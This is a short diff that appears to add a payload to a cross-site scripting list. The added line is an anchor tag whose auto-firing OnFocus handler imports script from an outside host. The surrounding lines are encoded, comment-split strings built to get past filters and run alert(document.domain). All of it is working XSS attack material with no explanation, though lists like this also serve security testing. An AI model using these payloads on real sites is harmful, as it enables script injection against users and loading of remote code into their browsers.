@@ -1,3 +1,4 @@
+<A HRef=//site.com AutoFocus %26%2362 OnFocus%0C=import(href)>
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 "+self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain'])//
 ";(a=alert,b=1,a(b))//
